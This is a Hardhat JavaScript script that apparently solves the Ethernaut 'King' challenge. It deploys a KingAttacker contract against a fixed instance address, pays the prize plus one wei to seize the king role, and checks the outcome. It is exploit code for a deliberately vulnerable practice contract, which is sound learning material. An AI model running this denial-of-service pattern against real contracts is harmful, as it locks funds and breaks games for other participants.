const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let owner, tx, res, bal
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0xE48CC2D724fD4F6a8f1FEB6EC70c7691489cDB23"
    let target = await ethers.getContractAt("King", instanceAddress)
    let attackerContractFactory = await ethers.getContractFactory(
        "KingAttacker"
    )
    let attackerContract = await attackerContractFactory.deploy(instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    console.log(`Attacker Contract deployed at ${attackerContract.address}`)

    // Attack
    bal = await target.prize()
    console.log(`Current prize is: ${bal} wei!`)
    tx = await attackerContract.attack({ value: bal.add(1) })
    await tx.wait(1)
    bal = await target.prize()
    console.log(`Updated prize is: ${bal} wei!`)

    // Check
    owner = await target._king()
    if (owner == attackerContract.address) {
        console.log(`${symbols.success} Attacker Contract is current KING!`)
    } else {
        console.log(`${symbols.error} King is ${owner}!`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
